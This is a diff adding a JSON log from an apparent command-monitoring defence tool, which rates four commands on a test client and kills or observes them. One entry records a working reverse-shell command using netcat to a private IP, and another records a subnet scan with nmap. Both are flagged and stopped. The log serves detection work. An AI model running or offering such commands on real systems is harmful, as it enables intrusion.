@@ -1,0 +1,38 @@
+[
+  {
+    "id": "1774187755.180952",
+    "timestamp": "13:55:55",
+    "client": "client-wsl-victim-01",
+    "command": "nc -e /bin/bash 10.0.0.5 4444",
+    "reasoning": "This command attempts to establish a reverse shell by piping /bin/bash to a remote IP address and port, indicating a critical compromise attempt.",
+    "action": "KILL_PROCESS",
+    "severity": "CRITICAL"
+  },
+  {
+    "id": "1774187752.459931",
+    "timestamp": "13:55:52",
+    "client": "client-wsl-victim-01",
+    "command": "nmap -sV 192.168.1.0/24",
+    "reasoning": "This command performs extensive network reconnaissance by scanning an entire subnet for service versions, a common precursor to attacks that should be immediately stopped.",
+    "action": "KILL_PROCESS",
+    "severity": "CRITICAL"
+  },
+  {
+    "id": "1774187745.397329",
+    "timestamp": "13:55:45",
+    "client": "client-wsl-victim-01",
+    "command": "cat /etc/os-release",
+    "reasoning": "This command gathers basic operating system information, which can be part of benign administration or initial reconnaissance.",
+    "action": "OBSERVE",
+    "severity": "INFO"
+  },
+  {
+    "id": "1774187741.3952434",
+    "timestamp": "13:55:41",
+    "client": "client-wsl-victim-01",
+    "command": "ls -la /var/www/html",
+    "reasoning": "This command is commonly used by administrators to inspect web server files and permissions, though it could also be used for initial reconnaissance.",
+    "action": "OBSERVE",
+    "severity": "INFO"
+  }
+]
